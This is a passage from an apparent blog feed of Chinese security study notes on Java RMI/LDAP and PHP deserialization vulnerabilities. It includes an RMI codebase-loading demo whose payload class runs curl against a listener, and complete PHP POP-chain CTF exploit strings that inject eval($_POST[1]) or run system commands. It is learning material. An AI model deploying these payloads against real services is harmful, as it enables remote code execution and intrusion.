class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CatImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">CreatureInterface</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">CatImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;miao&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">eat</span><span class="params">(Object object)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">calc</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Integer param : params) &#123;</span><br><span class="line">            sum += param;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// policy </span></span><br><span class="line">grant &#123; permission java.security.AllPermission; &#125;;</span><br></pre></td></tr></table></figure>
<p>设置<strong>Idea</strong>的<strong>vm option</strong>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-Djava.rmi.server.hostname=127.0.0.1 -Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -Djava.security.policy=/Users/south/Code/Java/Server/policy</span><br></pre></td></tr></table></figure>
<h5 id="client">Client</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// RMIClient.java</span></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">CreatureInterface</span> <span class="variable">c</span> <span class="operator">=</span> (CreatureInterface) Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/creature&quot;</span>);</span><br><span class="line">            List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">Payload</span>();</span><br><span class="line">            li.add(<span class="number">3</span>);</span><br><span class="line">            li.add(<span class="number">4</span>);</span><br><span class="line">            System.out.println(c.calc(li));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Payload</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;curl http://127.0.0.1:2333/payload&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CreatureInterface.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CreatureInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    </span><br><span class="line">    String <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"></span><br><span class="line">    Object <span class="title function_">eat</span><span class="params">(Object object)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"></span><br><span class="line">    Integer <span class="title function_">calc</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>设置<strong>Idea</strong>的<strong>vm option</strong>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -Djava.rmi.server.codebase=http://127.0.0.1:23333/</span><br></pre></td></tr></table></figure>
<h5 id="evilserver">EvilServer</h5>
<p>将<strong>client</strong>下编译好的<strong>payload.class</strong>放在其他目录下，然后启一个<strong>web</strong>服务。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m http.server 23333</span><br></pre></td></tr></table></figure>
<h5 id="结果">结果</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ListenServer</span></span><br><span class="line">python -m http.server 2333</span><br><span class="line">Serving HTTP on :: port 2333 (http://[::]:2333/) ...</span><br><span class="line">::ffff:127.0.0.1 - - [07/Jun/2022 23:43:20] code 404, message File not found</span><br><span class="line">::ffff:127.0.0.1 - - [07/Jun/2022 23:43:20] <span class="string">&quot;GET /payload HTTP/1.1&quot;</span> 404 -</span><br><span class="line">::ffff:127.0.0.1 - - [07/Jun/2022 23:43:20] code 404, message File not found</span><br><span class="line">::ffff:127.0.0.1 - - [07/Jun/2022 23:43:20] <span class="string">&quot;GET /payload HTTP/1.1&quot;</span> 404 -</span><br><span class="line"></span><br><span class="line"><span class="comment"># EvilServer</span></span><br><span class="line">python -m http.server 23333</span><br><span class="line">Serving HTTP on :: port 23333 (http://[::]:23333/) ...</span><br><span class="line">::ffff:127.0.0.1 - - [07/Jun/2022 23:43:20] <span class="string">&quot;GET /Payload.class HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>
<p>以上是通过<strong>Client</strong>攻击<strong>Server</strong>的示例，当然<strong>Server</strong>也可这般攻击<strong>Client</strong>，但攻击条件苛刻，因此只是做个了解。</p>
<h2 id="ldap">LDAP</h2>
<p>全称为<strong>Lightweight Directory Access
Protocol</strong>，是基于<strong>X.500
DAP</strong>【目录访问协议】的，但轻量且可定制，支持<strong>TCP/IP</strong>，定义在<strong><a
href="http://www.ietf.org/rfc/rfc2251.txt">RFC2251</a>/<a
href="https://datatracker.ietf.org/doc/rfc4511/">RFC4511</a></strong>中。</p>
<p>是一种有层次的树形结构，因此有优异的读性能，但写性能较差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。</p>
<p>是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。</p>
<p><strong>LDAP</strong>目录服务是由目录数据库和一套访问协议组成的系统。</p>
<p><strong>Java</strong>对象在<strong>LDAP</strong>目录中也有多种存储形式：</p>
<ul>
<li><strong>Java</strong>序列化</li>
<li><strong>JNDI Reference</strong></li>
<li><strong>Marshalled</strong>对象</li>
<li><strong>Remote Location</strong>【已弃用</li>
</ul>
<p><strong>LDAP</strong>可以为存储的<strong>Java</strong>对象指定多种属性：</p>
<ul>
<li><strong>javaCodeBase</strong></li>
<li><strong>objectClass</strong></li>
<li><strong>javaFactory</strong></li>
<li><strong>javaSerializedData</strong></li>
<li><strong>……</strong></li>
</ul>
<figure>
<img src="/images/Study-Unserialize-Java/webp" alt="img" />
<figcaption aria-hidden="true">img</figcaption>
</figure>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Server</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPSeriServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1389</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                port,</span><br><span class="line">                ServerSocketFactory.getDefault(),</span><br><span class="line">                SocketFactory.getDefault(),</span><br><span class="line">                (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line">            config.setSchema(<span class="literal">null</span>);</span><br><span class="line">            config.setEnforceAttributeSyntaxCompliance(<span class="literal">false</span>);</span><br><span class="line">            config.setEnforceSingleStructuralObjectClass(<span class="literal">false</span>);</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            ds.add(<span class="string">&quot;dn: &quot;</span> + <span class="string">&quot;dc=example,dc=com&quot;</span>, <span class="string">&quot;objectClass: top&quot;</span>, <span class="string">&quot;objectclass: domain&quot;</span>);</span><br><span class="line">            ds.add(<span class="string">&quot;dn: &quot;</span> + <span class="string">&quot;ou=employees,dc=example,dc=com&quot;</span>, <span class="string">&quot;objectClass: organizationalUnit&quot;</span>, <span class="string">&quot;objectClass: top&quot;</span>);</span><br><span class="line">            ds.add(<span class="string">&quot;dn: &quot;</span> + <span class="string">&quot;uid=longofo,ou=employees,dc=example,dc=com&quot;</span>, <span class="string">&quot;objectClass: ExportObject&quot;</span>);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Client</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPClient1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span>  ctx.lookup(<span class="string">&quot;ldap://127.0.0.1:1389/uid=longofo,ou=employees,dc=example,dc=com&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="reference">Reference</h1>
<p><a
href="https://www.liaoxuefeng.com/wiki/1252599548343744/1255945147512512">反射
- 廖雪峰的官方网站</a></p>
<p><a
href="https://www.cnblogs.com/noKing/p/9038234.html">Java反射-修改字段值,
反射修改static final修饰的字段</a></p>
<p><a href="https://paper.seebug.org/312/">深入理解 JAVA
反序列化漏洞</a></p>
<p><a
href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html">Java序列化的协议文档</a></p>
<p><a
href="https://thonsun.github.io/2020/12/04/rmi-li-yong-fen-xi">JavaSec
rmi利用分析</a></p>
<p><a
href="https://goodapple.top/archives/520">Java安全学习——利用RMI进行攻击</a></p>
<p><a href="http://wjlshare.com/archives/1522">浅谈 Java RMI</a></p>
<p><a href="https://su18.org/post/rmi-attack/">Java RMI
攻击由浅入深</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Java</tag>
        <tag>Unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>关于反序列化漏洞的初探</title>
    <url>/Study-Unserialize-PHP-Bypass/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="wakeup">wakeup</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;error_reporting&quot;, &quot;E_ALL &amp;amp; ~E_NOTICE&quot;);</span><br><span class="line"></span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public $func;</span><br><span class="line">    public $end2;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;end2 = &quot;die&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($method, $args)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;begin&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;func = &quot;system&quot;;</span><br><span class="line">        $waf = $this-&gt;end2;</span><br><span class="line">        $func = $this-&gt;func;</span><br><span class="line">        $waf();</span><br><span class="line">        $func($_GET[&quot;param&quot;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B</span><br><span class="line">&#123;</span><br><span class="line">    public $poc;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;poc-&gt;test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = unserialize($_GET[&quot;poc&quot;]);</span><br><span class="line">print_r($o);</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($str)&#123;</span><br><span class="line">    $str=str_replace(&quot;getflag&quot;,&#x27;hark&#x27;,$str);</span><br><span class="line">    return $str;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Start&#123;</span><br><span class="line">    public $start;</span><br><span class="line">    public $end;</span><br><span class="line">    public function __construct($start,$end)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;start=$start;</span><br><span class="line">        $this-&gt;end=$end;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Go&#123;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;ray;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Get&#123;</span><br><span class="line">    public $func;</span><br><span class="line">    public $name;</span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        call_user_func($this-&gt;func,$name);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name-&gt;&#123;$this-&gt;func&#125;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Done&#123;</span><br><span class="line">    public $eval;</span><br><span class="line">    public $class;</span><br><span class="line">    public $use;</span><br><span class="line">    public $useless;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;use=$this-&gt;useless;</span><br><span class="line">        eval($this-&gt;eval);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        $this-&gt;eval=&#x27;no way&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;ciscn_huaibei.pop&#x27;]))&#123;</span><br><span class="line">    $pop=new start($_GET[&#x27;ciscn_huaibei.pop&#x27;],$_GET[&#x27;pop&#x27;]);</span><br><span class="line">    $ser=filter(serialize($pop));</span><br><span class="line">    unserialize($ser);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">// http://172.1.14.1/pop.php?ciscn[huaibei.pop=getflaggetflaggetflaggetflaggetflaggetflag&amp;pop=;s:3:%22end%22;O:2:%22Go%22:1:&#123;s:3:%22ray%22;O:3:%22Get%22:2:&#123;s:4:%22func%22;s:9:%22phpinfo()%22;s:4:%22name%22;O:3:%22Get%22:2:&#123;s:4:%22func%22;O:4:%22Done%22:4:&#123;s:4:%22eval%22;s:16:%22eval($_POST[1]);%22;s:5:%22class%22;N;s:3:%22use%22;R:8;s:7:%22useless%22;s:16:%22eval($_POST[1]);%22;&#125;s:4:%22name%22;s:1:%221%22;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.1.14.1/pop.php?ciscn[huaibei.pop=getflaggetflaggetflaggetflaggetflaggetflag&amp;pop=;s:3:&quot;end&quot;;O:2:&quot;Go&quot;:1:&#123;s:3:&quot;ray&quot;;O:3:&quot;Get&quot;:2:&#123;s:4:&quot;func&quot;;s:9:&quot;phpinfo()&quot;;s:4:&quot;name&quot;;O:3:&quot;Get&quot;:2:&#123;s:4:&quot;func&quot;;O:4:&quot;Done&quot;:4:&#123;s:4:&quot;eval&quot;;s:16:&quot;eval($_POST[1]);&quot;;s:5:&quot;class&quot;;N;s:3:&quot;use&quot;;R:8;s:7:&quot;useless&quot;;s:16:&quot;eval($_POST[1]);&quot;;&#125;s:4:&quot;name&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public $func;</span><br><span class="line">    public $end2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B</span><br><span class="line">&#123;</span><br><span class="line">    public $poc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$test = new A();</span><br><span class="line">$test-&gt;func = &amp;$test-&gt;end2;</span><br><span class="line">print_r(serialize($test));</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?poc=O:1:%22A%22:2:&#123;s:4:%22func%22;N;s:4:%22end2%22;R:2;&#125;&amp;param=ls</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class one</span><br><span class="line">&#123;</span><br><span class="line">    public $object;</span><br><span class="line">    public $twotwo = array(0 =&gt; &quot;CTF&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class second</span><br><span class="line">&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class third</span><br><span class="line">&#123;</span><br><span class="line">    private $string;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;string = array(&quot;string&quot; =&gt; [new one(), &quot;MeMeMe&quot;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new one();</span><br><span class="line">$b = new one();</span><br><span class="line">$c = new second();</span><br><span class="line">$d = new third(&quot;haha&quot;);</span><br><span class="line">$b-&gt;object = $d;</span><br><span class="line">$c-&gt;filename = $b;</span><br><span class="line">$a-&gt;object = $c;</span><br><span class="line">$n = null;</span><br><span class="line">$payload = array($a, $n);</span><br><span class="line">echo urlencode(serialize($payload));</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class alpha</span><br><span class="line">&#123;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;seclover-&gt;seclover();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">abstract class beta</span><br><span class="line">&#123;</span><br><span class="line">    private $b = 1;</span><br><span class="line"></span><br><span class="line">    abstract protected function eval();</span><br><span class="line"></span><br><span class="line">    public function seclover()</span><br><span class="line">    &#123;</span><br><span class="line">        var_dump($this-&gt;beta);</span><br><span class="line">        ($this-&gt;beta)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class omega extends beta</span><br><span class="line">&#123;</span><br><span class="line">    private $func;</span><br><span class="line">    protected $key;</span><br><span class="line"></span><br><span class="line">    public function __construct($func, $key)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;func = $func;</span><br><span class="line">        $this-&gt;key = $key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected function eval()</span><br><span class="line">    &#123;</span><br><span class="line">        if (is_array($this-&gt;key)) &#123;</span><br><span class="line">            ($this-&gt;func)($this-&gt;key);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&quot;you know noting pop?&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dollar</span><br><span class="line">&#123;</span><br><span class="line">    public $key;</span><br><span class="line"></span><br><span class="line">    public function eval($func)</span><br><span class="line">    &#123;</span><br><span class="line">        var_dump($func);</span><br><span class="line">        $func($this-&gt;key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d = new dollar();</span><br><span class="line">$d-&gt;key = &#x27;whoami&#x27;;</span><br><span class="line">$c = new dollar();</span><br><span class="line">$c-&gt;key = &#x27;system&#x27;;</span><br><span class="line">$a = new omega([$c, &#x27;eval&#x27;], [$d, &#x27;eval&#x27;]);</span><br><span class="line">$a-&gt;beta = [$a, &#x27;eval&#x27;];</span><br><span class="line">$b = new alpha();</span><br><span class="line">$b-&gt;seclover = $a;</span><br><span class="line">echo base64_encode(serialize($b));</span><br><span class="line"></span><br><span class="line">//$a= unserialize(base64_decode($_GET[&#x27;a&#x27;]));</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
        <tag>Unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>关于反序列化漏洞的初探</title>
    <url>/Study-Unserialize-PHP/</url>
    <content><![CDATA[<h1 id="前置知识">前置知识</h1>
<p>面向对象编程</p>
<span id="more"></span>
<h1 id="简单介绍">简单介绍</h1>
<p>在<strong>PHP</strong>中存在两个方法，分别是<strong>serialize()</strong>和<strong>unserialize()</strong>这两个。</p>
<h2 id="示例">示例</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个类person</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">person</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建一个对象south</span></span><br><span class="line">    <span class="variable">$south</span> = <span class="keyword">new</span> <span class="title function_ invoke__">person</span>();</span><br><span class="line">    <span class="variable">$south</span> -&gt; name = <span class="string">&quot;south&quot;</span>;</span><br><span class="line">    <span class="variable">$south</span> -&gt; age = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出序列化后的值</span></span><br><span class="line">    <span class="variable">$north</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$south</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$north</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将north反序列化成对象southseast</span></span><br><span class="line">    <span class="variable">$southseast</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$north</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$southseast</span>-&gt;name.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后下面是输出结果。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:6:&quot;person&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;south&quot;;s:3:&quot;age&quot;;i:18;&#125;</span><br><span class="line">south</span><br></pre></td></tr></table></figure>
<p>可以很明显的看到其实是序列化其实是类似于把一个对象进行了<strong>Json</strong>格式化【只是长得像，实质格式完全不同。</p>
<h2 id="一个小知识点">一个小知识点</h2>
<p>对象的私有成员变量，类名称前会加上*****。</p>
<h2 id="序列化结果解析">序列化结果解析</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O: // 类型：</span><br><span class="line">6: // 类型名长度：</span><br><span class="line">&quot;person&quot;: // 类型名：</span><br><span class="line">2: // 成员变量个数</span><br><span class="line">&#123;s: // &#123;第一个成员变量类型：</span><br><span class="line">4: // 第一个成员变量名长度：</span><br><span class="line">&quot;name&quot;; // 第一个成员变量名；</span><br><span class="line">s: // 第一个成员变量值类型：</span><br><span class="line">5: // 第一个成员变量值长度：</span><br><span class="line">&quot;south&quot;; // 第一个成员变量值；</span><br><span class="line">s: // 第二个成员变量类型：</span><br><span class="line">3: // 第二个成员变量名长度：</span><br><span class="line">&quot;age&quot;; // 第二个成员变量名；</span><br><span class="line">i: // 第二个成员变量值类型：</span><br><span class="line">18;&#125; // 第二个成员变量值；</span><br></pre></td></tr></table></figure>
<h2 id="序列化结果类型详解">序列化结果类型详解</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a - array  </span><br><span class="line">b - boolean  </span><br><span class="line">d - double  </span><br><span class="line">i - integer</span><br><span class="line">o - common object</span><br><span class="line">r - reference</span><br><span class="line">s - string</span><br><span class="line">C - custom object</span><br><span class="line">O - class</span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - unicode string</span><br></pre></td></tr></table></figure>
<h1 id="漏洞原理">漏洞原理</h1>
<p><strong>PHP</strong>中引起反序列化漏洞的主要原因是<strong>PHP</strong>的魔术方法【<strong>magic
function</strong>，由双下划线开头的函数如**__construct()**等会在某些情况下会自动调用。</p>
<h2 id="一个重要结论">一个重要结论</h2>
<p>反序列化漏洞的产生原因是用户输入的数据具有危险性，而并非是反序列化本身。</p>
<p>看看<a
href="http://www.php.net/manual/zh/language.oop5.magic.php">官方文档</a>对魔术方法的介绍。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()， __sleep()， __wakeup()， __toString()， __invoke()， __set_state()， __clone() 和 __debugInfo() 等方法在PHP中被称为&quot;魔术方法&quot;（Magic methods）。在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能。</span><br></pre></td></tr></table></figure>
<p>举个例子，看看**__construct()**<a
href="http://php.net/manual/zh/language.oop5.decon.php#object.construct">这个函数</a>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP5允行开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</span><br></pre></td></tr></table></figure>
